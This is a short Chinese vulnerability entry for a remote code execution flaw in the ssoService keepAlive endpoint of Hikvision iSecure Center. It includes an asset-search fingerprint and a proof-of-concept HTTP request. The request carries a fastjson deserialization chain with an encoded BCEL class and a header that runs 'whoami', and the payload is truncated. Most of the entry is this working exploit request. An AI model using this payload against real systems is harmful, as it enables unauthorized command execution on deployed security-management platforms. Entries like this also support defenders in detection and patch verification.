# 海康威视iSecureCenter综合安防管理平台ssoService远程代码执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /bic/ssoService/v1/keepAlive HTTP/1.1`

**请求体 / payload**
```
POC：
Host: xx.xx.xx.xx
Content-Type: application/json
Testcmd: whoami
Content-Length: 5727
{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$d…（脚本共 5815 字，完整版见原文）
```

**其他**
- 海康威视iSecure Center 综合安防管理平台ssoService远程代码执行漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
***
- 版本: HIKVISION iSecure Center综合安防管理平台\